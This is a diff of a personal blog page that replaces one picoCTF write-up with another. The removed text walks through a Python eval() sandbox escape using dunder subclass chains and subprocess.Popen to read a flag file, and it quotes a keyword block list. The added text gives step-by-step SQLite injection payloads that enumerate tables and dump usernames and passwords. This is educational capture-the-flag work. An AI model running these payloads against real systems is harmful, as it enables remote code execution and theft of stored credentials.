@@ -123,142 +123,121 @@
       <!-- Introduction -->
       <section>
         <h2>Introduction</h2>
-        <p>Hi there! This was another fun one. Note: like Crack the Gate 2, I completed this multiple months ago, probably some time in March. It's been a minute—this writeup may or may not be a little jank. Don't say I didn't warn you, lol.</p>
-        
-        <p>The challenge description was short and immediately obvious about what was going on:</p>
-        <blockquote>
-          "ABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an eval function to calculate the loan."
-        </blockquote>
+        <p>
+          The entire challenge description for this one was just: "Do you want to fund my startup?" That's it. No hints about the vulnerability type, no obvious attack surface. Just a question and an inconspicous login page.
+        </p>
         
         <p>
-          <strong>Challenge Name:</strong> 3v@l<br>
-          <strong>Platform:</strong> picoCTF 2026<br>
+          <strong>Challenge Name:</strong> Startup Company<br>
+          <strong>Platform:</strong> picoCTF<br>
           <strong>Difficulty:</strong> Medium<br>
           <strong>Category:</strong> Web Exploitation
         </p>
         
-        <p>
-          RCE time. The word "eval" in a web app was basically a neon sign that says "please inject arbitrary code here." The real question wasn't <i>whether</i> that was exploitable, but rather <i>how</i>, given that someone had clearly tried to put up some defenses. It was only a matter of time.
-        </p>
+        <p>This one took me a little over an hour, and it was genuinely one of my favorite challenges so far. No hints, a completely self-directed path from blank page to flag, and some of my cleanest SQLi yet. </p>
+        
+        <p>Let's go.</p>
       </section><br>
     
       <!-- Recon -->
       <section class="blog-section">
         <h2 class="sectheading"></h2>
 
-        <h4>Gobuster and a Fun HTML Comment</h4>
+        <h4>Gobuster First</h4>
         
-        <p>Ran a quick gobuster scan first out of habit:</p>
+        <p>Skipping that first gobuster scan had burned me enough times before; by now I'd learned.</p>
 
         <pre><code>gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt</code></pre>
 
-        <p>I did find one interesting result: <code>/console</code>, returning a 400. Weird—made note of it and moved on. It wasn't reachable, so there probably wasn't much I could do with it, but might be worth remembering.</p>
+        <p>It found <code>.hta</code>, <code>.htaccess</code>, and <code>.htpasswd</code>. All were returning 403, as expected since those are protected Apache files, but more importantly, I now knew the app was running PHP. Maybe that could be helpful.</p>
 
-        <p>Loading the app itself, I noticed that the page source came with a complimentary copy of the dev's to-do list:</p>
+        <h4>Walking the App</h4>
 
-        <pre><code>&lt;!--
-    TODO
-    ------------
-    Secure python_flask eval execution by
-        1. blocking malicious keywords like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
-        2. Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'
---&gt;</code></pre>
+        <p>The main page had a login form POSTing to <code>index.php</code>, and a registration link up top pointing to <code>/register.php</code>. Oddly, there was already an "Invalid Login" message displayed before I'd even tried anything. Looking at the response in Burp Suite, I did also see a freshly assigned <code>PHPSESSID</code>. It took me a second, but I realized that meant the app was probably doing something with <code>$_SESSION</code> on page load—maybe that was important.</p>
 
-        <p>Let me say that again: the developer had accidentally left their entire security plan in a conveniently-placed HTML comment. I now knew exactly which keywords were blocked and exactly which regex patterns were being applied. The word "implementing" in that comment also raised a pretty important question—were they even finished with this part yet?</p>
+        <p>I poked at the login form briefly—tried admin/foo, tried submitting with only a username, only a password—nothing interesting, though. No error messages, no behavior change. The login form seemed to just be a login form. Crazy, I know.</p>
 
-        <h4>Oh, It's Just Python</h4>
-        <p>The app had a textarea whose contents were being POSTed to <code>/evaluate</code>, with a placeholder suggesting a loan formula like <code>PRT*RATE*TIME(10000*23*12)</code>. I tried that and got back:</p>
+        <p>So I registered an account: <code>user=jerry&pass=mouse</code>. It sent me back to the index page with a new prompt: "Thank you for volunteering, you can fund us with as much money as you'd like." On this index page was now a number input and a submit button, POSTing to <code>contribute.php</code>.</p>
 
-        <pre><code>Result: Error: name 'PRT' is not defined</code></pre>
+        <p>I donated $5 and watched the request in Burp; there were two POST parameters: <code>moneys=5</code> and <code>captcha=36</code>. That captcha value was interesting—looking at the source, it was coming from a hidden form field that changed on every page refresh, kinda like a CSRF token.</p>
 
-        <p>That error message was telling. The backend wasn't evaluating some custom formula language—that thing was running <i>straight Python</i> and sending the interpreter's error messages right back to us. I tried:</p>
-
-        <pre><code>print('gotcha?')</code></pre>
-
-        <p>Result: <code>None</code>. Python's <code>print()</code> statement always returns <code>None</code>. So this really is just raw Python <code>eval()</code>. Yay.</p>
+        <p>The page now showed: <i>"You're latest contribution: $5"</i></p>
+        <p>Side note - it's <i>your</i>, dammit. Smh.</p>
       </section><br>
       
-      <!-- mapping the filters -->
+      <!-- the injection point -->
       <section class="blog-section">
         <h2 class="sectheading"></h2>
                 
-        <p>Before I tried to break anything, I needed to understand what exactly the filters were actually doing. The TODO gave me a pretty good idea, so I started testing each piece one by one.</p>
+        <p>It seemed like the <code>moneys</code> value was being reflected directly on the page—that's always interesting. Since it was just an HTML form, I pulled up the web inspector and changed the input type from <code>number</code> to <code>text</code> and just started throwing stuff at it.</p>
 
-        <h4>Keywords</h4>
-        
-        <p>Trying <code>os</code> returned:</p>
+        <h4>Testing for Injection</h4>
+        <ul>
+          <li>Input <code>hello</code> — "You're latest contribution: $hello". Ok, so that confirms the value is being reflected, and it's unsanitized too. Fun combination.</li>
+          <li>Input <code>&lt;?php echo "Hello from PHP"; ?&gt;</code> — "You're latest contribution: $". Alright, <i>something</i> happened, but no output.</li>
+          <li>Input <code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code> — the page just froze while loading, indefinitely. I had to cancel. That script tag definitely did something.</li>
+          <li>Input <code>"</code> — that just reflected literally, nothing interesting</li>
+          <li>Input <code>;</code> — literally nothing</li>
+          <li>Input <code>'</code> — HEY, there we go!</li>
+        </ul>
 
-        <pre><code>Error: Detected forbidden keyword 'os'.</code></pre>
+        <pre><code>Warning: SQLite3::query(): Unable to prepare statement: 1,
+near "jerry": syntax error in /var/www/html/contribute.php on line 11</code></pre>
 
-        <p>Ok, so keyword blocking was working. But the list they planned to block was pretty specific: <code>os, eval, exec, bind, connect, python, socket, ls, cat, shell</code>. They missed a spot—more on that in a moment.</p>
+        <p>A single quote and the database explodes. Classic.</p>
 
-        
-        <h4>The Regex</h4>
-        
-        <p>The regex looked like it was supposed to block hex values, unicode escapes, URL encoding, file extensions, slashes, and <code>..</code>. Testing each pattern directly in the input showed they were actually just being removed rather than outright rejected—the response came back as <code>Error: Detected forbidden keyword ''.</code> An empty string—the pattern was just being stripped out. Ok, interesting.</p>
-
-        <p>What I found out was that there was one crucial thing missing from both the keyword list and the regex: <strong>underscores</strong>. If you're trying to secure a Python <code>eval()</code> and you forget to block underscores, you've kinda left the front door unlocked.</p>
-
-        <p>Python's whole object model is accessible through dunder (double underscore) attributes: if underscores work, there's suddenly an entire class of payloads now available. I tried <code>''.__class__</code> and got back... absolutely nothing? But in Burp Suite, the raw response showed:</p>
-
-        <pre><code>Result: &lt;class 'str'&gt;</code></pre>
-
-        <p>The result was there, but the greater-than and less-than in the response were being interpreted as HTML tags by the browser, and then failing to render. Burp Suite saved me from missing that entirely—one more reason that Burp is simply <i>awesome</i>.</p>
+        <p>That error message was really generous—it revealed the file path, the line number, the database type (SQLite3), and the fact that my username "jerry" was somehow embedded in the query. And the <code>moneys</code> field was being inserted into a query that already contained my username. One could infer, then, that this was probably an INSERT or UPDATE statement, not a SELECT. That complicated things a little.</p>
       </section><br>
 
       <!-- exploitation -->
       <section class="blog-section">
         <h2 class="sectheading"></h2>
         
-        <h4>Escaping the Python Sandbox with Subclasses</h4>
-        <p>With underscores working and the response visible in Burp, I ran the classic Python sandbox payload to get a list of my available subclasses:</p>
+        <h4>Understanding the Query Structure</h4>
+        <p>Before trying payloads, I needed to figure out roughly what the query looked like. The error mentioning "jerry" in the same statement as my <code>moneys</code> input suggested something like:</p>
 
-        <pre><code>''.__class__.__mro__[1].__subclasses__()</code></pre>
+        <pre><code>INSERT INTO some_table (money) VALUES (moneys) WHERE username='jerry'</code></pre>
 
-        <p>The first part of that, <code>''.__class__.__mro__</code>, references the inheritance tree for the <code>str</code> class; at index 1 of that tree is the <code>object</code> class. Then, the call to object's <code>__subclasses__()</code> lists every class that inherits from it. In other words, since the method was called on the <code>object</code> class, it lists out every class available for us to mess with—which in a Flask app running with subprocess support includes things like <code>subprocess.Popen</code>. I found it at index 356.</p>
+        <p>Or maybe it was an UPDATE statement, who knows. Either way, my input was probably going into a string field, since placing a single quote in my input broke things. I confirmed this by trying the good ol' <code>'--</code> payload as input—the SQL error disappeared and the "latest contribution" text went blank; the comment had cleanly eliminated the rest of the query.</p>
 
-        <p>Now I needed to figure out how to run a shell command. The obvious attempt:</p>
+        <p>So I was working with a quoted string context, in what was probably an INSERT/UPDATE, with output reflected back through the "latest contribution" display. The question was: how do I turn this write operation into a read operation so that I can exfiltrate data?</p>
 
-        <pre><code>''.__class__.__mro__[1].__subclasses__()[356]('ls', stdout=-1).communicate()[0]</code></pre>
+        <h4>The Humble SQLite Subquery</h4>
+        <p>I needed a way to exfiltrate data through a field that was storing and reflecting my input. I learned that in SQLite, you can concatenate strings with <code>||</code>—so if I could close my quoted string and somehow concatenate sensitive database info onto it, that sensitive info would get stored and then reflected back on the page.</p>
 
-        <p>Blocked—<code>ls</code> is on the forbidden keyword list. Ok, suit yourself.</p>
+        <p>And that's when I learned that <strong>subqueries</strong> are a thing. Conceptually:</p>
 
-        <pre><code>''.__class__.__mro__[1].__subclasses__()[356]('l' + 's', stdout=-1).communicate()[0]</code></pre>
+        <pre><code>' || (some subquery that returns data);--</code></pre>
 
-        <p>Blocked again, this time for <code>cat</code>. But I wasn't using <code>cat</code>... oh. <code>communiCATe</code>. Touché. The filter was case-insensitive, and it was just matching substrings. I had to find a way to split up the method name too.</p>
-        
-        <p>Eventually, after some intense googling, I figured out I could use <code>getattr()</code> to call the method by a split string instead of dot notation:</p>
+        <p>The single quote closes my input string; the <code>||</code> can then concatenate the result of the subquery onto my input, and the <code>;--</code> would effectively terminate the query there. I had the tools I needed—now I just had to figure out how to use them.</p>
 
-        <pre><code>(getattr(''.__class__.__mro__[1].__subclasses__()[356](['l' + 's'], stdout=-1), 'communica' + 'te'))()</code></pre>
+        <h4>Enumerating the Database</h4>
+        <p>First, find what tables exist in the first place:</p>
 
-        <pre><code>Result: b'app.py\nstatic\ntemplates\n'</code></pre>
+        <pre><code>' || (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1);--</code></pre>
 
-        <p>Success!</p>
+        <p>That spit out: <code>startup_users</code>. One table—that was it. That made things easier. Now we get its schema:</p>
 
-        
-        <h4>Getting a Slash</h4>
-        <p>Now I needed to navigate the filesystem, but slashes were blocked by the regex. My first idea (for <i>some</i> reason) was to run <code>ls -aF</code>, which appends <code>/</code> to directory names in its output, and harvest the slash character from the resulting bytes:</p>
+        <pre><code>' || (SELECT sql FROM sqlite_master WHERE tbl_name='startup_users' AND type='table' LIMIT 1);--</code></pre>
 
-        <pre><code>(getattr(''.__class__.__mro__[1].__subclasses__()[356](['l' + 's', '-aF'], stdout=-1), 'communica' + 'te'))()[0]</code></pre>
+        <p>That gave us:</p>
+        <pre><code>CREATE TABLE startup_users (nameuser text, wordpass text, money int)</code></pre>
 
-        <pre><code>b'./\n../\napp.py\nstatic/\ntemplates/\n'</code></pre>
+        <p>Three columns. Coool. Now I could dump the whole table row by row:</p>
 
-        <p>Index <code>[1]</code> of that byte string is the <code>/</code> character; now I had an expression that I could use to create slashes in order to navigate the filesystem. I tried building a command that used that harvested slash, but it turned into complete spaghetti that threw a syntax error. I still don't know why—all of the pieces of the command worked on their own with no error. Putting them together somehow broke the whole thing. Funnnnnnn.</p>
+        <pre><code>' || (SELECT nameuser FROM startup_users LIMIT 1 OFFSET 0) || ' pwd: ' || (SELECT wordpass FROM startup_users LIMIT 1 OFFSET 0) || ' money: ' || (SELECT money FROM startup_users LIMIT 1 OFFSET 0);--</code></pre>
 
-        <p>But then it hit me: <code>chr()</code> exists. Python already has a built-in function that converts an integer to a character. I didn't need to harvest anything from anywhere—I could've just done that from the very beginning.</p>
+        <p>That handed me the first row. From there, I just ran it a bunch more times, incrementing the offset value each time. The table came back as:</p>
 
-        <pre><code>(getattr(''.__class__.__mro__[1].__subclasses__()[356](['l' + 's', chr(47)], stdout=-1), 'communica' + 'te'))()[0]</code></pre>
+        <pre><code>name: admin pwd: password money: 0
+name: ron pwd: not_the_flag_db1d1c41 money: null
+name: veronica pwd: not_the_flag_de19f38f money: null
+name: brick pwd: not_the_flag_6d8cfc3e money: null
+...</code></pre>
 
-        <pre><code>Result: b'app\nbin\nboot\nchallenge\ndev\netc\nflag.txt\nhome\n...'</code></pre>
+        <p>There were a lot of entries. A few rows later, though, we got: <code>name: the_real_flag pwd: picoCTF{1_c4nn0t_s33_y0u_58183fce} money: null</code></p>
 
-        <p>Oh hey, <code>flag.txt</code>, just chilling in the root directory.</p>
-
-        <h4>Reading the Flag</h4>
-        <p>I used the same tricks: splitting <code>cat</code>, using <code>chr(47)</code> for the slash, <code>chr(46)</code> for the dot in <code>.txt</code>. The final payload was a little something like this:</p>
-
-        <pre><code>(getattr(''.__class__.__mro__[1].__subclasses__()[356](['ca' + 't', chr(47)+"flag"+chr(46)+"txt"], stdout=-1), 'communica' + 'te'))()[0]</code></pre>
-
-        <p>Flag. Woohoo</p>
+        <p>They even named it <code>the_real_flag</code> for me—I appreciated the transparency.</p>
       </section><br>
       
       <!-- Lessons Learned -->
@@ -266,21 +245,21 @@
         <h2 class="sectheading"></h2>
         
         <p>
-          This one took longer than it should have, mostly because the spaghetti slash-harvesting detour cost me a solid chunk of time. But the core technique was genuinely satisfying to work through, and it was exactly what TryHackMe had been teaching me to do over and over again.
+          Manual SQLi, all on my own, without any hints pointing me toward it—that felt genuinely good. <i>This</i> one made me feel like a 'hacker,' lol
         </p>
 
-        <h4>Key Takeaways</h4>
+        <h3>Key Takeaways</h3>
         <ul>
-          <li><strong>Forgetting to block underscores in a Python sandbox is one hell of a blunder.</strong> Python's dunder attribute chain is literally the textbook approach to escaping eval() sandboxes; if underscores aren't blocked, the sandbox isn't really a sandbox anymore.</li>
-          <li><strong>chr() exists. </strong> Can't forget about it. Just because it was blocked for one box I'd done before didn't mean it would be blocked for all of them.</li>
-          <li><strong>Burp Suite is king.</strong> Always check the raw response—that bit took me a while to figure out.</li>
-          <li><strong>Don't let your payload get so messy that not even <i>you</i> understand it anymore.</strong> The nested slash-harvesting approach technically worked, but it was a maintenance nightmare—there was just too much going on. More complex isn't usually better.</li>
+          <li><strong>Always poke at reflected values.</strong> The moment I saw <code>$5</code> echoed back on the page, that field became a suspect. Any reflected user input is worth testing, not just login forms and search boxes. Glad I kept looking.</li>
+          <li><strong>Know your database's quirks.</strong> SQLite uses <code>||</code> for string concatenation, not <code>+</code> or <code>CONCAT()</code>. MySQL, PostgreSQL, and SQLite all have slightly different syntax. Thankfully, that one descriptive error message told me what I was dealing with—but if I didn't know what the DBMS was, those differences could've cost me a LOT of troubleshooting.</li>          <li><strong>INSERT/UPDATE injection is different from SELECT injection.</strong> You can't just <code>UNION SELECT</code> your way to a result set—the query is writing, not reading. But if the written value gets reflected back somewhere on the page, you can subquery into that write and effectively turn it into a read.</li>
+          <li><strong>Manual SQLi is slow but teaches you what SQLMap is doing.</strong> Running the same query eight times with different OFFSET values to dump a table manually was somewhat tedious—but it just felt <i>so cool</i>. And now I knew exactly what SQLMap automates, from real experience—not just a THM lab.</li>
         </ul>
 
         <h3>What I'd Do Differently</h3>
-        <p>I should have thought of <code>chr()</code> way earlier. The slash problem showed up immediately after I confirmed RCE, and I went down an hour-long rabbit hole building a nested payload that somehow grew a mind of its own—when the clean (and probably the <i>intended</i>) solution was right there in Python's standard library. Getting creative is good, but remembering the basics is still nonnegotiable.</p>
+        <p>I spent a few minutes going down a CSRF bypass rabbit hole when I noticed the captcha token. That was a red herring—the captcha validated fine through normal usage, and the real vulnerability had nothing to do with it. I guess the lesson there is don't chase every suspicious detail at once. Note it, keep it in your back pocket, and keep walking the app first. That was a rabbit hole that had potential to eat a whole hour of my day—meanwhile, the answer was right there on the page staring back at me. Literally.</p>
 
-        <p>Maybe I'll remember next time.</p>
+        <h4>Final Thoughts</h4>
+        <p>No hints, start to finish, just over an hour. For a challenge that gave me nothing but "do you want to fund my startup?" as a starting point, I will <i>absolutely</i> take it. The satisfaction of dumping a database row by row with a payload you built yourself is something that's hard to describe—but it's exactly why I wanted to learn this stuff in the first place.</p>
       </section><br>
     
       <!-- Flags -->
